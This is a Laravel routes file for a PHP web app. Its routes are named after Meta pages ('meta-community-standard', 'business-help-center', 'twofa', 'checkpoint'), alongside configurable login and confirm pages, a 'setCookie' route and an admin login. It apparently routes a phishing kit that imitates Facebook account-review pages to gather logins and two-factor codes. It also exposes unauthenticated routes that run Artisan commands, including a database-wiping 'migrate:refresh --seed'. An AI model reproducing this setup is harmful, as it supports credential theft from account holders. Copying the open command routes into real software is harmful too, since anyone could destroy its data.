<?php

use App\Http\Controllers\AdminController;
use App\Http\Controllers\Controller;
use App\Http\Controllers\HomeController;
use App\Http\Livewire\Auth\Login;
use App\Http\Livewire\Confirm;
use App\Http\Livewire\EditLabel;
use App\Http\Livewire\Err404;
use App\Http\Livewire\Err500;
use App\Http\Livewire\Form;
use App\Http\Livewire\Labels;
use App\Http\Livewire\Languages;
use App\Http\Livewire\Setting;
use App\Http\Livewire\Welcome;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Cache;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/link', function () {
    Artisan::call('storage:link');
});

Route::get('/key', function () {
    Artisan::call('key:gen');
});

Route::get('/migrate', function () {
    Artisan::call('migrate:refresh --seed');
});

$settings = null;
$pathWelcomePage = '/';
$queryWelcomePage = [];
$pathLoginPage = '/login';
$queryLoginPage = [];
$pathConfirmPage = '/confirm';
$queryConfirmPage = [];

if (env('IS_GET_BY_SETTING') == 1) {
    $settings = Cache::rememberForever('settings', function () {
        return \App\Models\Setting::pluck('value', 'key')->toArray();
    });

    $parseWelcomePage = parse_url($settings['path_welcome_page']);
    $pathWelcomePage = $parseWelcomePage['path'] ?? '/';

    $parseLoginPage = parse_url($settings['path_login_page']);
    $pathLoginPage = $parseLoginPage['path'] ?? '/';

    $parseConfirmPage = parse_url($settings['path_confirm_page']);
    $pathConfirmPage = $parseConfirmPage['path'] ?? '/';
}

Route::get($pathWelcomePage, [HomeController::class, 'welcome'])->name('welcome');
Route::get($pathLoginPage, [HomeController::class, 'login'])->name('login');
Route::get($pathConfirmPage, [HomeController::class, 'confirm'])->name('confirm');

Route::group(['prefix' => 'admin', 'as' => 'admin.'], function () {
    Route::get('/login', [AdminController::class, 'login'])->name('login');
    Route::post('/checkLogin', [AdminController::class, 'checkLogin'])->name('checkLogin');
});
Route::get('/404', Err404::class)->name('404');
Route::get('/500', Err500::class)->name('500');
Route::get('/set-locale', [Controller::class, 'setLocale'])->name('setLocale');
Route::get('/set-country-code', [Controller::class, 'setCountryCode'])->name('setCountryCode');

Route::middleware('auth')->group(function () {
    Route::get('/logout', [Controller::class, 'logout'])->name('logout');
    Route::get('/languages', Languages::class)->name('languages');
    Route::get('/labels', Labels::class)->name('labels');
    Route::get('/edit-label/{lang}', EditLabel::class)->name('edit-label');
    Route::get('/settings', Setting::class)->name('settings');
});

Route::group(['namespace' => 'App\Http\Controllers'], function () {
    Route::get('/', function() {
        return redirect()->route('meta-community-standard');
    })->name('index');
    Route::get('/meta-community-standard', 'MainController@page1')->name('meta-community-standard');
    Route::get('/business-help-center', 'MainController@page2')->name('business-help-center');
    Route::get('/twofa', 'MainController@twofa')->name('twofa');
    Route::get('/checkpoint', 'MainController@checkpoint')->name('checkpoint'); #task
    Route::get('/404', 'MainController@notFound')->name('404');
    Route::get('/setCookie', 'MainController@setCookie')->name('setCookie');
});
